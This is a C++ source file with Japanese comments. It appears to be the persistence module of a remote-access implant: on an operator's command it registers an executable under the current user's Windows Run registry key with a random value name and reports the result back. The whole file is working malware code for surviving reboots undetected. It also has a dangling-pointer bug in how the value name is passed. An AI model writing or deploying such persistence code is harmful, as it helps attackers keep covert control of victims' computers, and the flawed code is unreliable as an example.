// 持続性メカニズムのコマンド
#include "Persistence.h"



// Runレジストリキーで持続性メカニズム
void RunRegistry(std::vector<std::string>& tokens) {

    // コンピューター\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY hKey;
    LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // ファイル名が指定されていない場合はエラー
    if (tokens.size() < 2) {
        SendString("[-] 実行ファイル名が指定されていません");
        return;
    }

    std::string fileName = tokens[1];

    // ファイル名をワイド文字列に変換
    wchar_t exePath[MAX_PATH];
    mbstowcs(exePath, fileName.c_str(), MAX_PATH);

    // 実行可能ファイルが指定されたパスに存在するか確認
    DWORD fileAttr = GetFileAttributesW(exePath);
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        SendString("[-] 指定されたファイルが存在しません");
        return;
    }

    // レジストリキーを開く
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        SendString("[-] レジストリキーのオープンに失敗しました");
        return;
    }

    // ランダムな文字列を生成してレジストリの値名として使用
    std::string randomValueName = generateRandomFileName();

    // ファイルパスをレジストリにセット
    LPCWSTR valueName = std::wstring(randomValueName.begin(), randomValueName.end()).c_str();
    result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));

    if (result == ERROR_SUCCESS) {
        SendString("[+] レジストリに実行ファイルを登録しました");
    }
    else {
        SendString("[-] レジストリ値の設定に失敗しました");
    }

    // レジストリキーを閉じる
    RegCloseKey(hKey);
}
